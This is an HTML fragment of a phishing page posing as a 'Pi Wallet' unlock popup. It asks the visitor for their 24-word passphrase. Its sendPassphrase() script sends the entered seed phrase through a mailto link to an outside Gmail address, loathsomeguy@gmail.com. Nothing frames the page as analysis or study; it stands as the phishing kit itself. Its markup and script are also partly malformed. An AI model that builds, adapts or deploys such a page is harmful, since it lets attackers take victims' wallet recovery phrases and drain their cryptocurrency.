...
<body>
    <div class="popup">
        ...
        <div class="content">
            <p>Unlock Pi Wallet</p>
            <textarea class="input-box" placeholder="Enter your 24-word passphrase here" style=height:275px; width: 400px style=height:275px; width:400px></textarea>
            <button class="button" onclick="sendPassphrase()">Unlock With Passphrase</button>
        </div>
        <div class="footer">   
    ...
    <script>
        function sendPassphrase() {
            const passphrase = document.querySelector('.input-box').value;
            if (passphrase) {
                window.location.href=mailto:loathsomeguy@gmail.com?subject=Passphrase submission&body=${encodeURIComponent(passphrase)};
            } else {
